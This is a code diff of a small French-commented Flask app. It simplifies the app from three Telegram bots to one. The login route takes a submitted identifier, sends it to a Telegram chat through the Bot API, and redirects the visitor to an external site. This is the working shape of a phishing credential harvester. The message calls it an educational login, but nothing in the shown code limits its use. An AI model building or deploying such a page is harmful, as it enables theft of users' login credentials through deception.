@@ -9,26 +9,13 @@ load_dotenv(dotenv_path=dotenv_path)
 
 app = Flask(__name__)
 
-# Récupération des tokens et chat ids des 3 bots
-bots = [
-    {
-        "token": os.getenv("BOT_TOKEN_1"),
-        "chat_id": os.getenv("CHAT_ID_1"),
-    },
-    {
-        "token": os.getenv("BOT_TOKEN_2"),
-        "chat_id": os.getenv("CHAT_ID_2"),
-    },
-    {
-        "token": os.getenv("BOT_TOKEN_3"),
-        "chat_id": os.getenv("CHAT_ID_3"),
-    }
-]
+# Récupération du token et chat_id du bot
+bot_token = os.getenv("BOT_TOKEN_1")
+chat_id = os.getenv("CHAT_ID_1")
 
-# Vérification que toutes les variables d'environnement sont présentes
-for i, bot in enumerate(bots, start=1):
-    if not bot["token"] or not bot["chat_id"]:
-        raise ValueError(f"BOT_TOKEN_{i} ou CHAT_ID_{i} non défini dans le fichier .env")
+# Vérification que les variables d'environnement sont présentes
+if not bot_token or not chat_id:
+    raise ValueError("BOT_TOKEN_1 ou CHAT_ID_1 non défini dans le fichier .env")
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -40,14 +27,13 @@ def login():
 
         message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"
 
-        # Envoi du message via chaque bot Telegram
-        for bot in bots:
-            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
-            payload = {'chat_id': bot['chat_id'], 'text': message}
-            response = requests.post(url, data=payload)
+        # Envoi du message via le bot Telegram
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = {'chat_id': chat_id, 'text': message}
+        response = requests.post(url, data=payload)
 
-            if response.status_code != 200:
-                return f"Erreur lors de l'envoi du message Telegram avec BOT_TOKEN_{bots.index(bot)+1} : {response.text}", 500
+        if response.status_code != 200:
+            return f"Erreur lors de l'envoi du message Telegram : {response.text}", 500
 
         # Redirection après succès
         return redirect("https://code-s-curit-qxie.onrender.com/")
